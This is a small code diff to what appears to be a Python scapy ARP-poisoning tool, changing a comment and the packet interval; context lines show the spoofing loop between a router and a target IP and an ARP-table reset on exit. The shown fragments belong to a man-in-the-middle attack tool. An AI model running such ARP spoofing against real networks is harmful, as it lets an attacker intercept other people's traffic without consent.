@@ -3,7 +3,7 @@ import time
 import optparse as parse
 
 
-# Getting target mac address/
+# Getting target mac address
 def get_target_mac_address(ip):
         arp_request_packet = scapy.ARP(pdst=ip)
         broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") # Regex
@@ -54,7 +54,7 @@ try:
         arp_poisoning(user_router_ip ,user_target_ip)
         counter +=2
         print("\r Sending pakets : " + str(counter),end="")
-        time.sleep(2)
+        time.sleep(3)
 except KeyboardInterrupt:
     print("\nSuccessed Quit & Reset !")
     reset_arp_posion_operation(user_target_ip,user_router_ip)
